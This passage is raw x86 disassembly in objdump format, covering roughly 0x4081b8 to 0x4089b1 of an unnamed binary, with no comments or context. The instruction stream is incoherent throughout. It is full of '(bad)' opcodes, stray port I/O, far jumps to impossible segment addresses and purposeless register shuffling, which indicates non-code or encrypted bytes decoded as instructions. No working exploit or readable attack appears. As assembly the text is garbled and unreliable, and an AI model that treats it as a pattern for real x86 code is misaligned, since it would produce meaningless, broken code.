  4081b8:	mov    ds:0x5a5551ad,al
  4081bd:	jl     0x4081fe
  4081bf:	pop    ecx
  4081c0:	sub    eax,0x4dce53df
  4081c5:	das    
  4081c6:	adc    eax,0x81d4314d
  4081cb:	jp     0x40818a
  4081cd:	pop    ecx
  4081ce:	xchg   ah,dh
  4081d0:	mov    edi,0x803f0159
  4081d5:	and    DWORD PTR [edx],0x97794ba8
  4081db:	jp     0x408212
  4081dd:	jecxz  0x408179
  4081df:	jb     0x4081a7
  4081e1:	sub    eax,0x801fe028
  4081e6:	xchg   BYTE PTR [edx+ebp*8+0x25],bh
  4081ea:	out    0x4c,eax
  4081ec:	add    BYTE PTR [esi],dl
  4081ee:	inc    ebp
  4081ef:	xor    al,0xe2
  4081f1:	popf   
  4081f2:	dec    esi
  4081f3:	dec    ecx
  4081f4:	pop    es
  4081f5:	adc    eax,0x78bffd0d
  4081fa:	mov    eax,ds:0x8baf5fa1
  4081ff:	sar    BYTE PTR [edi],1
  408201:	push   esi
  408202:	mov    ebp,0x57dbf9fd
  408207:	and    eax,0x5d0789e
  40820c:	push   ebx
  40820d:	call   0x22b0a47f
  408212:	xchg   edx,eax
  408213:	aas    
  408214:	cmp    DWORD PTR [edx+ebx*8-0x37eaa0d8],edi
  40821b:	in     al,dx
  40821c:	add    BYTE PTR [ebx-0x58531e2a],bl
  408222:	out    dx,al
  408223:	out    dx,al
  408224:	sbb    DWORD PTR [edx+eax*2-0x18508b09],0xffffffb6
  40822c:	cmp    cl,BYTE PTR [ebp+0x2d]
  40822f:	pop    eax
  408230:	push   ds
  408231:	mov    gs,ebp
  408233:	cmp    al,0xd
  408235:	mov    bh,0x37
  408237:	(bad)  
  408238:	mov    dh,BYTE PTR [ebx-0x3f]
  40823b:	scas   al,BYTE PTR es:[edi]
  40823c:	adc    BYTE PTR [esi],0xb3
  40823f:	xchg   esp,eax
  408240:	mov    eax,DWORD PTR [ebp+ebp*2+0x7e]
  408244:	retf   0xe63a
  408247:	out    dx,eax
  408248:	jge    0x40820d
  40824a:	jno    0x408229
  40824c:	std    
  40824d:	mov    ebx,DWORD PTR [ebx+0x7d]
  408250:	das    
  408251:	jmp    0x54e8:0x25fc2a94
  408258:	jnp    0x40823b
  40825a:	lahf   
  40825b:	sbb    al,0x53
  40825d:	das    
  40825e:	fs stos DWORD PTR es:[edi],eax
  408260:	or     al,0xb8
  408262:	mov    ebx,0x81f46cce
  408267:	and    ebx,DWORD PTR [edx]
  408269:	sbb    bh,cl
  40826b:	sub    eax,0xec220dad
  408270:	shr    DWORD PTR [edi-0x54ac9ccc],1
  408276:	mov    ds:0x44affdac,al
  40827b:	dec    eax
  40827c:	or     bh,ch
  40827e:	iret   
  40827f:	popa   
  408280:	(bad)  
  408281:	jmp    0xd4dd632b
  408286:	push   ds
  408287:	mov    esi,0x2a5fdc6
  40828c:	xchg   ecx,eax
  40828d:	or     BYTE PTR [esi-0x1c],cl
  408290:	and    al,0xdc
  408292:	inc    edi
  408293:	(bad)  
  408294:	fnstenv [esi]
  408296:	mov    edi,0x81da47ff
  40829b:	cwde   
  40829c:	push   0x92e01e8a
  4082a1:	sbb    ch,BYTE PTR [esi+0x14]
  4082a4:	adc    eax,0x47a791a6
  4082a9:	mov    ecx,0x393ac7c4
  4082ae:	xchg   esp,eax
  4082af:	mov    esi,0xc1481df
  4082b4:	into   
  4082b5:	xor    esp,DWORD PTR [eax-0x66]
  4082b8:	or     BYTE PTR [ebp-0x56],bh
  4082bb:	mov    ds:0x5738ff58,eax
  4082c0:	shr    BYTE PTR [ebx+0x2b],cl
  4082c3:	shl    DWORD PTR [edx-0x3e],0x3e
  4082c7:	scas   al,BYTE PTR es:[edi]
  4082c8:	into   
  4082c9:	add    BYTE PTR [esi],dl
  4082cb:	sahf   
  4082cc:	fwait
  4082cd:	nop
  4082ce:	das    
  4082cf:	test   esp,edx
  4082d1:	push   edi
  4082d2:	cmc    
  4082d3:	cmp    esp,DWORD PTR [ebx]
  4082d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082d6:	mov    BYTE PTR [edi+0x55eaf9d3],ah
  4082dc:	cmp    eax,0x7b817b1f
  4082e1:	inc    esi
  4082e2:	xor    BYTE PTR [eax-0x2e],ch
  4082e5:	dec    ebp
  4082e6:	out    dx,al
  4082e7:	ins    DWORD PTR es:[edi],dx
  4082e8:	or     DWORD PTR [esi],esi
  4082ea:	dec    edi
  4082eb:	stos   BYTE PTR es:[edi],al
  4082ec:	dec    esi
  4082ed:	xlat   BYTE PTR ds:[ebx]
  4082ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082ef:	push   0xffffffe6
  4082f1:	jg     0x40830c
  4082f3:	mov    esi,0x55b6af78
  4082f8:	icebp  
  4082f9:	(bad)  
  4082fa:	mov    esp,0xdc74387b
  4082ff:	ficomp WORD PTR [edi-0x35c5b174]
  408305:	ds call 0xbe45793b
  40830b:	sub    bh,BYTE PTR [eax+edx*2-0xb0d280c]
  408312:	xor    ah,BYTE PTR [ebx+0x593e4f30]
  408318:	out    0x5a,al
  40831a:	xchg   ebx,eax
  40831b:	fistp  DWORD PTR ds:0x84d305d5
  408321:	repnz aam 0x90
  408324:	jmp    0x408328
  408326:	stos   BYTE PTR es:[edi],al
  408327:	test   al,0x30
  408329:	mov    bh,0x89
  40832b:	sbb    eax,0x2da147b1
  408330:	(bad)  
  408332:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408333:	pop    edi
  408334:	mov    BYTE PTR [edx],dh
  408336:	cmp    bh,0x84
  408339:	adc    DWORD PTR [ebp+0x16],0x5d01d2a8
  408340:	xor    al,0xce
  408342:	fistp  WORD PTR [eax+0x0]
  408345:	jb     0x40836f
  408347:	rol    DWORD PTR [esi],1
  408349:	sbb    al,0x15
  40834b:	jne    0x40838a
  40834d:	cmp    DWORD PTR [ebx],ecx
  40834f:	inc    edx
  408350:	arpl   WORD PTR [ebx],cx
  408352:	(bad)  
  408353:	popa   
  408354:	(bad)  
  408355:	popf   
  408356:	in     al,dx
  408357:	pop    ss
  408358:	js     0x4082df
  40835a:	sub    DWORD PTR [edx],edx
  40835c:	(bad)  
  40835d:	ror    DWORD PTR [edx],cl
  40835f:	sub    eax,ebx
  408361:	xchg   DWORD PTR [ecx],ecx
  408363:	jl     0x408336
  408365:	cmp    eax,0x2d3d27f4
  40836a:	jg     0x408351
  40836c:	jge    0x408326
  40836e:	pop    es
  40836f:	es dec edx
  408371:	mov    esi,0x2b3d6db6
  408376:	pop    ss
  408377:	dec    edi
  408378:	pop    edi
  408379:	mov    esi,0x44464d3e
  40837e:	pop    edx
  40837f:	(bad)  
  408380:	cld    
  408381:	std    
  408382:	xor    BYTE PTR [ebx+0x7f55c90b],bl
  408388:	arpl   WORD PTR [eax+0x49],si
  40838b:	sub    eax,0xf4983bbf
  408390:	aam    0x4e
  408392:	aam    0xa1
  408394:	ins    DWORD PTR es:[edi],dx
  408395:	mov    edx,0x74a908ea
  40839a:	xchg   ebp,eax
  40839b:	js     0x40838f
  40839d:	pop    esp
  40839e:	rol    BYTE PTR [ebx+0x12],0x36
  4083a2:	xchg   esp,eax
  4083a3:	add    esp,edi
  4083a5:	jne    0x40840f
  4083a7:	pop    eax
  4083a8:	daa    
  4083a9:	cmp    BYTE PTR [ebx+0x21b419e6],bl
  4083af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083b0:	add    BYTE PTR [ebx+0x25],cl
  4083b3:	mov    WORD PTR [edi],?
  4083b5:	out    0x67,eax
  4083b7:	adc    DWORD PTR [eax+0x6],eax
  4083ba:	inc    ebx
  4083bb:	jns    0x408378
  4083bd:	xor    edx,esi
  4083bf:	adc    DWORD PTR [edi+0x41f6a5e2],eax
  4083c5:	adc    esp,DWORD PTR [eax]
  4083c7:	mov    WORD PTR [edi],ds
  4083c9:	into   
  4083ca:	sbb    esp,DWORD PTR [ebx+0x7f]
  4083cd:	cmp    al,0xb6
  4083cf:	push   edi
  4083d0:	fsub   DWORD PTR [eax]
  4083d2:	out    dx,al
  4083d3:	bound  ecx,QWORD PTR [ebp+0x5]
  4083d6:	dec    esp
  4083d7:	or     al,0x36
  4083d9:	sub    DWORD PTR [eax],esp
  4083db:	push   ecx
  4083dc:	or     DWORD PTR [edx-0x4ee75124],ebx
  4083e2:	adc    al,0x83
  4083e4:	mov    ecx,0x9b41a75a
  4083e9:	pop    DWORD PTR [esi]
  4083eb:	push   ss
  4083ec:	sub    eax,0x2207104c
  4083f1:	(bad)  
  4083f3:	mov    al,0xcd
  4083f5:	fadd   st(1),st
  4083f7:	aaa    
  4083f8:	add    al,0x6a
  4083fa:	cdq    
  4083fb:	add    al,0x6a
  4083fd:	sbb    BYTE PTR [eax+0x4a8df902],cl
  408403:	adc    cl,bl
  408405:	or     al,0x60
  408407:	inc    eax
  408408:	stos   DWORD PTR es:[edi],eax
  408409:	dec    ebx
  40840a:	mov    ah,0xc
  40840c:	test   eax,0x8b289d64
  408411:	mov    al,0x51
  408413:	dec    edi
  408414:	add    edi,DWORD PTR [edx]
  408416:	hlt    
  408417:	inc    ecx
  408418:	adc    DWORD PTR [eax-0x12e3203b],esp
  40841e:	dec    esi
  40841f:	mov    dh,0xed
  408421:	call   0x4b9bb7f1
  408426:	test   al,0xa8
  408428:	pop    esi
  408429:	dec    ebp
  40842a:	ds stc 
  40842c:	mov    dl,0x82
  40842e:	std    
  40842f:	xor    eax,DWORD PTR [ebp-0x27]
  408432:	aaa    
  408433:	aad    0xdb
  408435:	mov    esi,0x15b954de
  40843a:	loop   0x408423
  40843c:	sbb    al,0xe9
  40843e:	jns    0x4083c4
  408440:	cdq    
  408441:	mov    DWORD PTR [edx-0x81caab9],ebp
  408447:	push   esi
  408448:	push   ebx
  408449:	mov    cl,0x0
  40844b:	dec    esi
  40844c:	shr    BYTE PTR [esi-0x5f735db5],0x15
  408453:	fimul  WORD PTR [ecx-0x29]
  408456:	push   ecx
  408457:	daa    
  408458:	loop   0x40841c
  40845a:	out    0x8,eax
  40845c:	test   eax,0xac151e8c
  408461:	outs   dx,DWORD PTR ds:[esi]
  408462:	cs test dl,bl
  408465:	sub    eax,0x412d2220
  40846a:	adc    al,0x5a
  40846c:	dec    esp
  40846d:	inc    esi
  40846e:	ja     0x4084ef
  408470:	jp     0x408437
  408472:	mov    ah,0xbe
  408474:	and    DWORD PTR [ebp-0x1f59c8ad],0x74f3d6cc
  40847e:	xchg   DWORD PTR [ecx],ecx
  408480:	push   es
  408481:	pop    esp
  408482:	ss ds repz out dx,eax
  408486:	add    al,BYTE PTR [edi]
  408488:	js     0x4084dd
  40848a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40848b:	mov    eax,0x3e1e161f
  408490:	sub    BYTE PTR [ebp+0x3],0x35
  408494:	loop   0x408458
  408496:	cdq    
  408497:	dec    ecx
  408498:	iret   
  408499:	add    esp,DWORD PTR [edi+0x61]
  40849c:	fisub  DWORD PTR [edx-0x27]
  40849f:	inc    edx
  4084a0:	mov    ebp,DWORD PTR [esi-0x53236102]
  4084a6:	dec    edx
  4084a7:	xchg   BYTE PTR [ecx+esi*1],dh
  4084aa:	mov    edi,0xfd7eaca1
  4084af:	call   0x5264:0xbd831a98
  4084b6:	in     eax,dx
  4084b7:	js     0x408458
  4084b9:	xchg   DWORD PTR ds:0x36867a3a,eax
  4084bf:	cmp    DWORD PTR [edx-0x1ffd7012],ecx
  4084c5:	pushf  
  4084c6:	cld    
  4084c7:	data16 jae 0x408518
  4084ca:	ins    DWORD PTR es:[edi],dx
  4084cb:	scas   al,BYTE PTR es:[edi]
  4084cc:	xadd   BYTE PTR [ecx-0x41],dl
  4084d0:	pop    es
  4084d1:	scas   al,BYTE PTR es:[edi]
  4084d2:	add    al,0xaa
  4084d4:	and    BYTE PTR [ecx-0x3c33e791],0x25
  4084db:	jmp    0x40853e
  4084dd:	mov    al,ds:0xf382ee25
  4084e2:	mov    esp,edi
  4084e4:	sub    esi,DWORD PTR [eax-0x1ea1ed0]
  4084ea:	or     eax,0x27252fc
  4084ef:	popf   
  4084f0:	pop    ss
  4084f1:	div    edi
  4084f3:	in     al,dx
  4084f4:	xor    eax,0xf6ad07e5
  4084f9:	mov    cl,0xb
  4084fb:	push   0xedd23d89
  408500:	fadd   st(3),st
  408502:	xor    bh,BYTE PTR [ebp-0x67]
  408505:	rcl    DWORD PTR [ebx-0x61bf7962],1
  40850b:	retf   0x674c
  40850e:	adc    eax,0x7f2368ce
  408513:	repnz inc ebp
  408515:	sub    eax,0x1790a922
  40851a:	inc    esp
  40851b:	pop    edi
  40851c:	shl    DWORD PTR [esi+0x49d9fff4],1
  408522:	ja     0x4084a4
  408524:	je     0x408551
  408526:	cmp    BYTE PTR [edi+0x46e4c9fb],bh
  40852c:	(bad)  
  40852d:	mov    dh,0xaf
  40852f:	mov    DWORD PTR [ebx+0x5],eax
  408532:	in     eax,dx
  408533:	mov    ah,0x56
  408535:	dec    eax
  408536:	jl     0x408576
  408538:	shl    BYTE PTR gs:[edx+ebp*8],0xf5
  40853d:	in     eax,0xaf
  40853f:	(bad)  
  408540:	inc    eax
  408541:	and    al,BYTE PTR [ecx+0x2]
  408544:	mov    ebx,0x7543de01
  408549:	and    BYTE PTR [esi+0x3f],cl
  40854c:	dec    ebx
  40854d:	cmp    edx,edi
  40854f:	stos   BYTE PTR es:[edi],al
  408550:	clc    
  408551:	jp     0x408562
  408553:	xchg   ebx,eax
  408554:	fmul   DWORD PTR [edi+0x179119d4]
  40855a:	add    BYTE PTR [ecx+0x41b00084],bl
  408560:	adc    eax,0xa9e1518c
  408565:	or     eax,0x9e738d05
  40856a:	aad    0x5c
  40856c:	push   ecx
  40856d:	adc    ecx,esp
  40856f:	fiadd  WORD PTR [ebx+0x70c8eab5]
  408575:	mov    ah,0xdc
  408577:	pushf  
  408578:	out    dx,al
  408579:	mov    ebx,0x80fc61b
  40857e:	mov    BYTE PTR [ebp+0x5],0xc5
  408582:	adc    DWORD PTR [eax-0x32],esp
  408585:	add    eax,0x975bfbb6
  40858a:	xchg   edi,eax
  40858b:	outs   dx,BYTE PTR ds:[esi]
  40858c:	cmp    DWORD PTR [ebx],edi
  40858e:	mov    esp,0x37764141
  408593:	aad    0xa0
  408595:	push   esp
  408596:	jmp    0x4085af
  408598:	add    esp,DWORD PTR [esp+ebp*1+0x7c]
  40859c:	mov    ebp,0xe7623961
  4085a1:	or     BYTE PTR [ebx+ebx*2-0x5126d3b3],dl
  4085a8:	push   0x68f26db0
  4085ad:	push   0x7b6f51ce
  4085b2:	cmp    al,bh
  4085b4:	repz jno 0x408583
  4085b7:	inc    esp
  4085b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085b9:	inc    ebp
  4085ba:	add    eax,0x620a5ba3
  4085bf:	in     eax,0x6c
  4085c1:	out    0xf4,eax
  4085c3:	push   cs
  4085c4:	clc    
  4085c5:	xchg   DWORD PTR [edi+0x2f],esi
  4085c8:	sub    DWORD PTR [edx-0x64],edi
  4085cb:	addr16 jle 0x408588
  4085ce:	stos   DWORD PTR es:[edi],eax
  4085cf:	sub    ch,BYTE PTR [edx-0x3011a77b]
  4085d5:	or     al,0xe7
  4085d7:	add    eax,0x3312c6ec
  4085dc:	sub    DWORD PTR [ebp+0x20f61819],esp
  4085e2:	and    al,0xdf
  4085e4:	sar    BYTE PTR es:[ebx],1
  4085e7:	xchg   ebx,eax
  4085e8:	mov    ds:0x1ff6e65c,al
  4085ed:	xor    al,0x6c
  4085ef:	xor    al,0xcf
  4085f1:	and    ch,BYTE PTR [esi-0x7fdfb03c]
  4085f7:	(bad)  
  4085fb:	sbb    eax,0x1f177f9d
  408600:	leave  
  408601:	xchg   ah,dl
  408603:	mov    ch,0xf3
  408605:	mov    cl,0x1b
  408607:	and    eax,0x13f549e3
  40860c:	fcmovnb st,st(0)
  40860e:	xchg   ecx,eax
  40860f:	dec    ecx
  408610:	data16 loopne 0x40866a
  408613:	push   ecx
  408614:	pop    ecx
  408615:	xor    al,0xb7
  408617:	mov    al,ds:0x6381009b
  40861c:	dec    edi
  40861d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40861e:	popa   
  40861f:	mov    eax,0xa1dc953d
  408624:	push   0x1d
  408626:	lock mov ebp,0x30ac5d68
  40862c:	div    DWORD PTR [edx+0x569d109e]
  408632:	xchg   ebx,eax
  408633:	ins    BYTE PTR es:[edi],dx
  408634:	or     eax,DWORD PTR [esi-0x35]
  408637:	pop    esp
  408638:	addr16 cld 
  40863a:	ror    al,1
  40863c:	jp     0x4085f9
  40863e:	inc    ebx
  40863f:	mov    ss,WORD PTR [ecx]
  408641:	jmp    0x4086bc
  408643:	in     eax,0x96
  408645:	or     esp,edx
  408647:	and    al,0xde
  408649:	cld    
  40864a:	popa   
  40864b:	cmp    cl,BYTE PTR [edx-0x1325ec47]
  408651:	sub    edi,eax
  408653:	arpl   sp,di
  408655:	nop
  408656:	cmp    DWORD PTR [edx],eax
  408658:	pop    edx
  408659:	inc    ebp
  40865a:	(bad)  
  40865c:	mov    ds:0xdd2d7951,eax
  408661:	or     esp,DWORD PTR [eax+eiz*2-0x7be446b8]
  408668:	mov    fs,WORD PTR [esi]
  40866a:	add    ecx,DWORD PTR [edi-0x551b7d65]
  408670:	sahf   
  408671:	imul   BYTE PTR [ebx]
  408673:	pushf  
  408674:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408675:	sbb    eax,0xb0b85c77
  40867a:	clc    
  40867b:	inc    edx
  40867c:	(bad)  
  40867d:	rcl    BYTE PTR [ecx],0x48
  408680:	mov    dh,0x26
  408682:	jae    0x40860d
  408684:	mov    al,ds:0x1c43bb71
  408689:	sbb    BYTE PTR [eax+edi*8],0x94
  40868d:	mov    WORD PTR ds:0xa5d5c77a,ds
  408693:	pop    edi
  408694:	sbb    al,0x3d
  408696:	push   esp
  408697:	inc    ebp
  408698:	(bad)  
  408699:	and    esi,DWORD PTR [esi-0x26b3d16e]
  40869f:	xchg   ebx,edx
  4086a1:	inc    esi
  4086a2:	mov    esi,es
  4086a4:	push   ecx
  4086a5:	xchg   ebx,eax
  4086a6:	or     al,0x55
  4086a8:	bound  eax,QWORD PTR [ebp+eax*4-0x16e1f663]
  4086af:	test   DWORD PTR [edx-0xf272772],ecx
  4086b5:	adc    al,0x9b
  4086b7:	mov    eax,ds:0x56c5d3e
  4086bc:	ja     0x408684
  4086be:	jmp    0x408651
  4086c0:	shr    BYTE PTR [edx],1
  4086c2:	(bad)  
  4086c3:	mov    ds:0x581dfde3,al
  4086c8:	or     DWORD PTR [edx+eiz*2],esp
  4086cb:	cmc    
  4086cc:	cmp    DWORD PTR [ebx],ebp
  4086ce:	xchg   ebx,eax
  4086cf:	ret    
  4086d0:	cdq    
  4086d1:	sti    
  4086d2:	addr16 xchg ebp,eax
  4086d4:	outs   dx,BYTE PTR ds:[esi]
  4086d5:	add    DWORD PTR [eax+0x7994a0e8],eax
  4086db:	aam    0xae
  4086dd:	pop    eax
  4086de:	push   0xa3da7c54
  4086e3:	dec    ecx
  4086e4:	shl    DWORD PTR [edi-0x4f446270],0x9f
  4086eb:	sbb    esi,eax
  4086ed:	sub    al,0x2c
  4086ef:	jmp    0x40867a
  4086f1:	xchg   DWORD PTR [edi+0x71],edi
  4086f4:	in     al,0x87
  4086f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086f7:	jg     0x408749
  4086f9:	rcl    DWORD PTR [esi+0x30],cl
  4086fc:	popa   
  4086fd:	test   BYTE PTR [ecx-0x577b50a0],al
  408703:	sub    ch,BYTE PTR [ebx-0x2c]
  408706:	loope  0x4086bb
  408708:	mov    ?,WORD PTR [edi-0x10]
  40870b:	inc    edi
  40870c:	test   dl,al
  40870e:	arpl   WORD PTR ds:[eax],bx
  408711:	cmp    ecx,ebx
  408713:	push   esi
  408714:	push   eax
  408715:	or     BYTE PTR [edi-0x5b],bl
  408718:	push   esi
  408719:	fiadd  DWORD PTR [eax+0x3a]
  40871c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40871d:	push   eax
  40871e:	mov    ds:0x1fafc211,eax
  408723:	inc    ebp
  408724:	push   eax
  408725:	mov    ah,BYTE PTR [edx-0x38]
  408728:	imul   esi,esp,0x66
  40872b:	xchg   ebx,eax
  40872c:	arpl   WORD PTR [edi*1-0x45dbd585],ax
  408733:	in     al,dx
  408734:	aam    0xf5
  408736:	adc    al,0x10
  408738:	aam    0xdf
  40873a:	cmc    
  40873b:	push   DWORD PTR [edi+edx*1-0x1d]
  40873f:	mov    cl,0xca
  408741:	jmp    0x99a7eb57
  408746:	xchg   DWORD PTR [esi-0x4dc9dce],edi
  40874c:	retf   0xdccc
  40874f:	adc    eax,0x2491459c
  408754:	aad    0x35
  408756:	les    ebp,FWORD PTR [edi+0x3d]
  408759:	js     0x408752
  40875b:	push   edi
  40875c:	mov    al,ds:0x15709e31
  408761:	inc    ebp
  408762:	dec    esp
  408763:	mov    eax,0x8a2d4d93
  408768:	loopne 0x408792
  40876a:	mov    esp,0x19c08d02
  40876f:	mov    dh,0xc6
  408771:	mov    cl,0x13
  408773:	add    DWORD PTR [ebp+0x575693b6],0xffffffec
  40877a:	sbb    eax,esp
  40877c:	add    cl,al
  40877e:	push   esi
  40877f:	sub    bh,BYTE PTR [eax+ecx*2-0xf]
  408783:	sbb    BYTE PTR [esi+0x36],bh
  408786:	retf   
  408787:	lods   al,BYTE PTR ds:[esi]
  408788:	gs mov edi,0x296c671c
  40878e:	sub    esp,DWORD PTR [esi-0x34]
  408791:	jmp    0x4087e5
  408793:	arpl   WORD PTR [edx+0x5c60ad5c],si
  408799:	add    ebx,DWORD PTR [ebp-0x64]
  40879c:	and    bl,BYTE PTR [ebx]
  40879e:	push   edi
  40879f:	dec    ebx
  4087a0:	call   0xf24:0x52070a7e
  4087a7:	or     DWORD PTR [ebx-0x31],0x71
  4087ab:	mov    al,0x4d
  4087ad:	cwde   
  4087ae:	adc    BYTE PTR [esi-0x1d2803e1],ch
  4087b4:	cmp    bh,BYTE PTR [ecx]
  4087b6:	or     DWORD PTR [esi],ebx
  4087b8:	jo     0x4087e9
  4087ba:	sti    
  4087bb:	dec    eax
  4087bc:	or     al,0x73
  4087be:	gs mov bl,0xf7
  4087c1:	enter  0xadf6,0x60
  4087c5:	inc    esi
  4087c6:	stos   BYTE PTR es:[edi],al
  4087c7:	or     al,0xbd
  4087c9:	mov    cs,WORD PTR [edi-0x75e7c6a6]
  4087cf:	cwde   
  4087d0:	fmul   st,st(5)
  4087d2:	jnp    0x408804
  4087d4:	fnstenv [ecx]
  4087d6:	mov    bl,0x19
  4087d8:	iret   
  4087d9:	xchg   esi,eax
  4087da:	jle    0x40878c
  4087dc:	fwait
  4087dd:	mov    edi,DWORD PTR [eax-0x12c1d4c3]
  4087e3:	into   
  4087e4:	xchg   ebp,eax
  4087e5:	fnstsw WORD PTR [eax]
  4087e7:	mov    fs,WORD PTR [esi+edx*1]
  4087ea:	test   edx,ebp
  4087ec:	std    
  4087ed:	lods   eax,DWORD PTR ds:[esi]
  4087ee:	mov    ecx,edi
  4087f0:	out    dx,al
  4087f1:	(bad)  
  4087f2:	lds    edx,FWORD PTR [edx-0x65c0efca]
  4087f8:	in     al,dx
  4087f9:	lea    esp,[ebx-0x6bcea96a]
  4087ff:	in     eax,0x42
  408801:	je     0x408803
  408803:	test   al,0x0
  408805:	add    al,0x7f
  408807:	scas   eax,DWORD PTR es:[edi]
  408808:	out    dx,al
  408809:	lahf   
  40880a:	sub    eax,0x669e277e
  40880f:	dec    ebx
  408810:	fdivp  st(2),st
  408812:	ja     0x408870
  408814:	ficomp DWORD PTR [edi-0x12]
  408817:	jae    0x4087a8
  408819:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40881a:	cwde   
  40881b:	call   0xc3e06273
  408820:	mov    eax,ds:0xc86a1af6
  408825:	xchg   edx,eax
  408826:	dec    esp
  408827:	ret    
  408828:	xchg   ebp,eax
  408829:	aaa    
  40882a:	dec    esi
  40882b:	nop
  40882c:	aas    
  40882d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40882e:	lods   al,BYTE PTR ds:[esi]
  40882f:	mov    ecx,0x1495daf8
  408834:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408835:	out    dx,al
  408836:	add    eax,0x7d2ee6fa
  40883b:	sti    
  40883c:	cdq    
  40883d:	cmp    BYTE PTR [edx+0x167fef35],ah
  408843:	jmp    DWORD PTR [ecx-0x3f087c98]
  408849:	lock rol esi,1
  40884c:	mov    ecx,0x88729a5
  408851:	inc    esi
  408852:	sub    ebp,DWORD PTR [esi+0x2c5c50c2]
  408858:	mov    dl,0x34
  40885a:	sbb    ah,0xe5
  40885d:	lds    edi,FWORD PTR [edi]
  40885f:	aad    0xf6
  408861:	js     0x4088bb
  408863:	shr    DWORD PTR [ecx],0xbd
  408866:	ja     0x408803
  408868:	aaa    
  408869:	mov    al,0xae
  40886b:	mov    al,0xad
  40886d:	leave  
  40886e:	xor    al,bh
  408870:	jg     0x4088c6
  408872:	ins    DWORD PTR es:[edi],dx
  408873:	lods   eax,DWORD PTR ds:[esi]
  408874:	mov    dl,0x6
  408876:	or     BYTE PTR [edi+ebp*4],0xf4
  40887a:	and    eax,0xcb5bc48c
  40887f:	jno    0x4088a2
  408881:	mov    ecx,0xc57f01f3
  408886:	pop    esp
  408887:	jb     0x4088cb
  408889:	pusha  
  40888a:	shl    DWORD PTR [ebp-0x28],cl
  40888d:	dec    eax
  40888e:	dec    ebp
  40888f:	mov    edi,0xef601962
  408894:	popa   
  408895:	jb     0x4088e4
  408897:	rol    BYTE PTR [edx+0x544650b],0xba
  40889e:	cmp    BYTE PTR [ebp-0x6a],dh
  4088a1:	xchg   edx,eax
  4088a2:	test   DWORD PTR ds:0xecc170df,edi
  4088a8:	(bad)
  4088ac:	rol    BYTE PTR [ebx+0x10],cl
  4088af:	call   0xd5868dd3
  4088b4:	ins    DWORD PTR es:[edi],dx
  4088b5:	sub    al,0xfa
  4088b7:	xor    DWORD PTR [ebx+0x4a],esp
  4088ba:	retf   
  4088bb:	xor    BYTE PTR [edx],dl
  4088bd:	push   cs
  4088be:	jecxz  0x40889e
  4088c0:	fcomp  DWORD PTR [ebx]
  4088c2:	ret    
  4088c3:	pusha  
  4088c4:	xchg   edi,eax
  4088c5:	cs (bad) 
  4088c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088c8:	jno    0x4088fb
  4088ca:	ds ss and DWORD PTR es:[edi-0xd],ebp
  4088d0:	mov    edi,0x5c204289
  4088d5:	ja     0x4088d4
  4088d7:	cmp    bh,BYTE PTR [edx+0x3a6759ea]
  4088dd:	jbe    0x4088fd
  4088df:	and    al,0xac
  4088e1:	mov    bl,0xf8
  4088e3:	jnp    0x408885
  4088e5:	(bad)  
  4088e6:	add    dl,BYTE PTR es:[edi-0x20111ce1]
  4088ed:	aaa    
  4088ee:	sub    edx,DWORD PTR [ebp+0x70e29bc4]
  4088f4:	lods   eax,DWORD PTR ds:[esi]
  4088f5:	mov    esi,0x5b569783
  4088fa:	pop    es
  4088fb:	inc    ebx
  4088fc:	rcr    BYTE PTR fs:[ebp+0x18a2739e],1
  408903:	pop    ebp
  408904:	rcl    BYTE PTR [ebp+0x40],cl
  408907:	jmp    0x8b2f:0xcada95ff
  40890e:	sbb    ch,bh
  408910:	mov    esp,DWORD PTR [ebx-0x77]
  408913:	enter  0xb512,0xe7
  408917:	jnp    0x4088aa
  408919:	sbb    eax,0x4b3ce47
  40891e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40891f:	(bad)  
  408920:	mov    ecx,0x503ea15b
  408925:	sbb    BYTE PTR es:[esi+0x69],al
  408929:	mov    ch,0xc3
  40892b:	aam    0xb0
  40892d:	pop    esp
  40892e:	js     0x40895e
  408930:	jmp    0x5d80:0x590e080b
  408937:	inc    edx
  408938:	shr    ecx,0x61
  40893b:	pop    edx
  40893c:	ja     0x408997
  40893e:	mov    edx,0xea4f8644
  408943:	ja     0x40894a
  408945:	xchg   edi,eax
  408946:	cdq    
  408947:	mov    ds,ecx
  408949:	xchg   DWORD PTR [edx+0x4f],esp
  40894c:	retf   
  40894d:	mov    bh,0xd8
  40894f:	mov    ebp,0xba618e9a
  408954:	mov    ebx,0x9640a45b
  408959:	xor    DWORD PTR [edi],ebp
  40895b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40895c:	(bad)  
  40895d:	cmp    ebp,edi
  40895f:	push   0xa
  408961:	es call 0x988d:0xb4b7672b
  408969:	mov    dl,0x4
  40896b:	sbb    dl,BYTE PTR [ecx]
  40896d:	jmp    0x4089d7
  40896f:	jl     0x4089d7
  408971:	ficomp WORD PTR [edi-0x4b]
  408974:	mov    edi,0x18514c81
  408979:	inc    edi
  40897a:	(bad)  
  40897b:	mov    eax,0x656f9b27
  408980:	adc    ah,BYTE PTR [ecx-0x66]
  408983:	xor    eax,0x24244c93
  408988:	jno    0x4089a9
  40898a:	repz and al,0xb7
  40898d:	add    BYTE PTR [ecx-0x34],cl
  408990:	add    ah,BYTE PTR [ebp-0x49eaa51]
  408996:	mov    gs:0x3d59d462,al
  40899c:	imul   ecx,DWORD PTR [ebx+ecx*8+0x3b],0x3f
  4089a1:	jmp    0x40895a
  4089a3:	dec    eax
  4089a4:	sbb    dh,bl
  4089a6:	mov    ebp,0x32caa30a
  4089ab:	adc    bl,ch
  4089ad:	fld    TBYTE PTR [ebp+0x1a]
  4089b0:	lahf   
  4089b1:	xchg   ecx,ebp
